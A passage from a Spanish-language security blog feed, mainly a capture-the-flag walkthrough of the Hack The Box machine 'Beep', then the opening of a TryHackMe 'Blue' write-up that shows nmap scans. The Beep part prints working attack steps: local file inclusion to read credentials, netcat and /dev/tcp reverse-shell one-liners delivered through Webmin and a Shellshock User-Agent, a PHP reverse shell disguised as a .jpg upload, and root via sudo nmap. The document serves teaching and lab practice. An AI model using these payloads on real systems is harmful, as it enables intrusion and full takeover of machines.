&lt;p&gt;En efecto, pero antes de intentar explotar este &lt;em&gt;LFI&lt;/em&gt;, debemos confirmar si en primer lugar existe la primera ruta, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/vtigercrm/&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez confirmamos que la ruta existe, podemos pasar a explotar el &lt;em&gt;LFI&lt;/em&gt;. Si nos percatamos, se está haciendo uso de un &lt;em&gt;null byte&lt;/em&gt;, así como de varios &lt;em&gt;directory path traversal&lt;/em&gt;, esto con el fin de leer el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/amportal.conf&lt;/code&gt;, pero perfectamente podríamos listar cualquier otro archivo del sistema.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/12.png&quot; alt=&quot;12&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Leer esto así es un poco complicado, así que podríamos hacer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl + U&lt;/code&gt;, para verlo de mejor manera.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/13.png&quot; alt=&quot;13&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;El archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/amportal.conf&lt;/code&gt;, como su nombre mismo indica, es un archivo de configuración para el portal de gestión de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Asterisk&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Si recordamos, otro servicio que detectamos con &lt;em&gt;Nmap&lt;/em&gt;, fue el servicio &lt;em&gt;SSH&lt;/em&gt; en el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;22&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/14.png&quot; alt=&quot;14&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por lo que procederemos a autenticarnos con las credenciales encontradas:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh root@10.10.10.7
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al intentar conectarnos por &lt;em&gt;SSH&lt;/em&gt;, vemos que la conexión no se puede establecer debido a que no existe un algoritmo de encriptación en común entre la máquina víctima, y nuestra máquina de atacante. Para solucionar este problema, debemos forzar a nuestra máquina usar alguno de los algoritmos que se nos presenta, pese a ser considerados como menos seguros.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -o KexAlgorithms=diffie-hellman-group-exchange-sha1 root@10.10.10.7
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/16.png&quot; alt=&quot;16&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al habernos conectado a la máquina directamente como root, no es necesario realizar la escalada de privilegios, por lo que podríamos listar sin ningún problema tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/17.png&quot; alt=&quot;17&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;fase-de-explotación---webmin&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación - Webmin&lt;/h3&gt;

&lt;p&gt;Al igual que intentamos probar contraseñas por defecto en el panel de login del servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Elastix&lt;/code&gt;, podemos hacer lo mismo en el panel de autenticación del servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Webmin&lt;/code&gt;, pero al igual que ocurrió antes, las &lt;a href=&quot;https://help.eset.com/era_deploy_va/64/en-US/index.html?webmin.htm&quot;&gt;siguientes&lt;/a&gt; credenciales no nos permiten ingresar.&lt;/p&gt;

&lt;p&gt;Otra opción muy buena sería utilizar las credenciales que encontramos antes, las cuales de hecho funcionan, es decir, se están reutilizando credenciales, otra muy mala práctica que aún hoy en día, persiste.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/18.png&quot; alt=&quot;18&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Estando dentro podríamos programar la ejecución de cualquier comando, a nivel de cualquier usuario en el sistema, en nuestro caso, nos interesa entablarnos una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse shell&lt;/code&gt;; &lt;a href=&quot;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;aquí&lt;/a&gt; tenemos algunos ejemplos, pero nosotros los vamos a hacer a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NetCat&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para lo cual, desde nuestra máquina de atacantes deberemos de ponernos en escucha a través del puerto que queramos.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nc -nlvp &amp;lt;puertoCualquiera&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/19.png&quot; alt=&quot;19&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc &amp;lt;nuestraIP&amp;gt; &amp;lt;puertoCualquiera&amp;gt; &amp;gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/20.png&quot; alt=&quot;20&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Después de darle a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;save&lt;/code&gt;, y habiendo pasado el tiempo que hayamos programado, conseguiremos una shell como el usuario root, por lo que nuevamente, no hizo falta la escalada de privilegios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/21.png&quot; alt=&quot;21&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De modo que podremos leer sin problema alguno tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/22.png&quot; alt=&quot;22&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;fase-de-explotación---shellshock&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación - Shellshock&lt;/h3&gt;

&lt;p&gt;Si nos percatamos, en el ataque anterior, depués de haber intentado ingresar como un usuario no válido, se añade al &lt;em&gt;url&lt;/em&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/session_login.cgi&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/23.png&quot; alt=&quot;23&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esto llama nuestra atención ya que los archivos de extensión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.cgi&lt;/code&gt;, o dentro del directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/&lt;/code&gt;, son utilizados para ejecutar programas en el servidor, y esto lo hacen a través de una interfaz de línea comandos (CLI), por lo que, si la bash es vulnerable, podemos realizar un ataque &lt;a href=&quot;https://mateonitro550.github.io/Shellshock&quot;&gt;shellshock&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Lo más cómodo sería realizar este ataque desde nuestra terminal, sin embargo, debido al problema del &lt;em&gt;certificado SSL&lt;/em&gt; autofirmado, a la hora de utilizar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;, nos va a dar un error.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/24.png&quot; alt=&quot;24&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Este error lo podríamos solucionar utilizando uno de los parámetros que nos otorga &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;, concretamente el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-k&lt;/code&gt; o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--insecure&lt;/code&gt;, el cual permite tramitar este tipo de peticiones inseguras. Sin embargo, ni así, nos es posible explotar el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellshock&lt;/code&gt; de esta forma, por lo que tendremos que hacerlo de otra manera.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/25.png&quot; alt=&quot;25&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para poder cambiar el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;User-Agent&lt;/code&gt; de otra forma, podríamos hacerlo a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Burp Suite&lt;/code&gt;, y así, entablarnos una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse shell&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Primero vamos a emitir una petición al panel de autenticación con credenciales al azar, y posteriormente, desde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Burp Suite&lt;/code&gt;, con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl + R&lt;/code&gt;, vamos a mandar nuestra petición al &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Repeater&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/26.png&quot; alt=&quot;26&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/27.png&quot; alt=&quot;27&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Después, vamos a borrar el contenido que se encuentra en el campo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;User-Agent&lt;/code&gt;, y lo vamos a reemplazar con nuestro código malicioso. Para variar un poco, la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse shell&lt;/code&gt; la conseguiremos a través de bash, a diferencia de como lo hicimos en la explotación del servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Webmin&lt;/code&gt;; nuevamente, este tipo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse shells&lt;/code&gt;, las podemos conseguir &lt;a href=&quot;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;aquí&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;En primer lugar, desde nuestra máquina de atacantes, a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NetCat&lt;/code&gt;, tenemos que ponernos en escucha a través de un puerto cualquiera.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nc -nlvp &amp;lt;puertoCualquiera&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y, el código malicioso que vamos a ingresar en el campo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;User-Agent&lt;/code&gt; será:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;() { :; }; bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;nuestraIP&amp;gt;/&amp;lt;puertoCualquiera&amp;gt; 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finalmente, presionaremos el botón &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Send&lt;/code&gt;, para que emitir nuestra petición.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/28.png&quot; alt=&quot;28&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y al igual que en los casos anteriores, sin necesidad de escalada de privilegios, podremos leer tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios, sin ninguna complicación.&lt;/p&gt;

&lt;h3 id=&quot;fase-de-explotación---file-upload-bypass&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación - File Upload Bypass&lt;/h3&gt;

&lt;p&gt;Si recordamos, en la fase de explotación a través del uso de un &lt;em&gt;LFI&lt;/em&gt;, habíamos descubierto un panel de login de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Vtiger CRM&lt;/code&gt;; al igual que en las situaciones anteriores, podemos probar una serie de credenciales por defecto, pero estas no servirán, por lo que nos queda la opción de reutilizar las credenciales que ya habíamos encontrado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/29.png&quot; alt=&quot;29&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y en efecto, una vez dentro, podemos empezar a investigar un poco; en el apartado &lt;em&gt;Settings/Company Details&lt;/em&gt;, vamos a ver que hay una opción que nos permite cambiar el logo de la compañía, por lo que ya vamos teniendo una idea, de que podemos hacer.&lt;/p&gt;

&lt;p&gt;De manera casi similar a la máquina &lt;a href=&quot;https://mateonitro550.github.io/Vulnversity-TryHackMe&quot;&gt;Vulnversity&lt;/a&gt; de &lt;em&gt;TryHackMe&lt;/em&gt;, vamos a tener que disfrazar un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.jpg&lt;/code&gt;. No obstante, en este caso será un poco más sencillo ya que no haremos uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Burp Suite&lt;/code&gt; (aunque podríamos); lo único que vamos a hacer es añadir la extensión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.jpg&lt;/code&gt; a nuestra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverseShell.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/30.png&quot; alt=&quot;30&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podríamos utilizar la &lt;a href=&quot;https://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;&lt;em&gt;reverse shell&lt;/em&gt;&lt;/a&gt; que nos provee &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pentestmonkey&lt;/code&gt; (para lo cual debemos modificar el campo &lt;em&gt;ip&lt;/em&gt;, y colocar la nuestra, y si quisiéramos el campo &lt;em&gt;port&lt;/em&gt;), o bien, crear nuestra propia &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse shell&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc &amp;lt;nuestraIP&amp;gt; &amp;lt;puertoCualquiera&amp;gt; &amp;gt;/tmp/f&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y al igual que en los casos anteriores, previo a darle a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Save&lt;/code&gt;, debemos de estar en escucha a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NetCat&lt;/code&gt;, por el puerto que hayamos indicado en nuestra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse shell&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nc -nlvp &amp;lt;puertoCualquiera&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/31.png&quot; alt=&quot;31&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si nos percatamos, a diferencia de los casos anteriores, no somos el usuario root, somos el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asterisk&lt;/code&gt;, por lo que ahora si debemos escalar privilegios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/32.png&quot; alt=&quot;32&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;escalada-de-privilegios&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Escalada De Privilegios&lt;/h3&gt;

&lt;p&gt;Para conseguir la flag del usuario con máximos privilegios, al ser el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asterisk&lt;/code&gt;, será bastante sencillo, ya que este usuario usualmente tiene acceso a ejecutar algunos binarios haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;, por lo que, lo primero que vamos a hacer es listar que binarios podemos ejecutar como root.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo -l
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/33.png&quot; alt=&quot;33&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La mejor forma para abusar de cualquier binario, es recurrir a &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt;, esta página nos enseña como explotar binarios con capabilities mal asignadas, binarios con permisos SUID mal asignados, y en este caso, binarios que se pueden ejecutar como root.&lt;/p&gt;

&lt;p&gt;En este caso, tenemos un abanico de oportunidades, tenemos binarios como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chown&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;service&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yum&lt;/code&gt;, y el binario que vamos a explotar en esta ocasión: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para explotar el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, bastará con ejecutar su modo interactivo, con el cual después, generaremos una bash con máximo privilegios.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--interactive&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/34.png&quot; alt=&quot;34&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Posterior a ello, podemos buscar la flag dentro de todo el sistema, y leerla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/35.png&quot; alt=&quot;35&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 06 Dec 2021 00:00:00 -0500</pubDate>
        <link>/es/Beep-Hack-The-Box/</link>
        <guid isPermaLink="true">/es/Beep-Hack-The-Box/</guid>
      </item>
    
      <item>
        <title>Blue - TryHackMe</title>
        <description>&lt;p&gt;Hoy vamos a estar resolviendo la máquina &lt;em&gt;Blue&lt;/em&gt; de &lt;em&gt;TryHackMe&lt;/em&gt;. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla.&lt;/p&gt;

&lt;p&gt;Ya por el nombre de la máquina, podemos darnos una idea de por donde van los tiros, ¿quizá &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EternalBlue&lt;/code&gt;?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-11-15-Blue-TryHackMe/1.png&quot; alt=&quot;Info Card&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;fase-de-reconocimiento&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Reconocimiento&lt;/h3&gt;

&lt;p&gt;Primeramente, vamos a utilizar la herramienta &lt;em&gt;Nmap&lt;/em&gt; para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de puertos con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todo el rango de puertos (65535 en total)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;--open&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-T5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-v&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;em&gt;Verbose&lt;/em&gt;, reporta lo encontrado por consola&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
